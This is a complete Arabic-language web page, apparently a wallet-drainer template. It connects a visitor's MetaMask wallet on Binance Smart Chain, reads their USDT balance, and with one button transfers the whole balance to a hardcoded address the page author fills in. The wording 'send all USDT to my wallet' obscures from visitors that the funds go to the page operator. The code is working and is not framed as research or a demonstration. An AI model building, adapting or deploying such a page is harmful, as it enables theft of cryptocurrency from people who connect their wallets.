<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>إرسال USDT على BSC</title>
<style>
  body {
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    background: #1e1e2f;
    color: #eee;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 40px 20px;
  }
  h2 {
    margin-bottom: 25px;
    color: #7fffd4;
  }
  button {
    padding: 12px 24px;
    font-size: 18px;
    background-color: #7fffd4;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: background-color 0.3s ease;
    color: #1e1e2f;
    margin-top: 15px;
  }
  button:disabled {
    background-color: #555;
    cursor: not-allowed;
  }
  #walletAddress, #usdtBalance, #status {
    margin-top: 15px;
    font-weight: bold;
  }
  #status {
    min-height: 40px;
  }
</style>
</head>
<body>

<h2>ربط محفظتك على Binance Smart Chain وإرسال USDT</h2>

<button id="connectBtn">ربط المحفظة</button>
<div id="walletAddress"></div>
<div id="usdtBalance"></div>
<button id="sendBtn" disabled>إرسال كل USDT إلى محفظتي</button>

<div id="status"></div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT على BSC
  const recipientAddress = "ضع_هنا_عنوان_محفظتك"; // غيره هنا

  const usdtAbi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  let provider, signer, userAddress, contract;

  const connectBtn = document.getElementById("connectBtn");
  const sendBtn = document.getElementById("sendBtn");
  const walletAddressDiv = document.getElementById("walletAddress");
  const usdtBalanceDiv = document.getElementById("usdtBalance");
  const statusDiv = document.getElementById("status");

  connectBtn.onclick = async () => {
    try {
      if (!window.ethereum) throw new Error("يرجى تثبيت MetaMask!");

      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      userAddress = await signer.getAddress();

      walletAddressDiv.textContent = "محفظتك: " + userAddress;

      const network = await provider.getNetwork();
      if (network.chainId !== 56) throw new Error("يرجى التبديل إلى شبكة Binance Smart Chain في MetaMask.");

      contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
      const balance = await contract.balanceOf(userAddress);
      const formattedBalance = ethers.utils.formatUnits(balance, 18);

      usdtBalanceDiv.textContent = "رصيد USDT: " + formattedBalance;

      sendBtn.disabled = balance.isZero();
      statusDiv.textContent = "";
    } catch (err) {
      statusDiv.textContent = err.message || err;
      sendBtn.disabled = true;
      walletAddressDiv.textContent = "";
      usdtBalanceDiv.textContent = "";
    }
  };

  sendBtn.onclick = async () => {
    try {
      statusDiv.textContent = "جارٍ إرسال المعاملة، يرجى الانتظار...";
      const balance = await contract.balanceOf(userAddress);
      if (balance.isZero()) {
        statusDiv.textContent = "رصيدك صفر، لا يوجد ما يتم إرساله.";
        sendBtn.disabled = true;
        return;
      }

      const tx = await contract.transfer(recipientAddress, balance);
      await tx.wait();

      statusDiv.textContent = "تم إرسال جميع USDT إلى محفظتي بنجاح!";
      sendBtn.disabled = true;
      usdtBalanceDiv.textContent = "رصيد USDT: 0";
    } catch (err) {
      statusDiv.textContent = "حدث خطأ: " + (err.message || err);
    }
  };
</script>

</body>
</html>
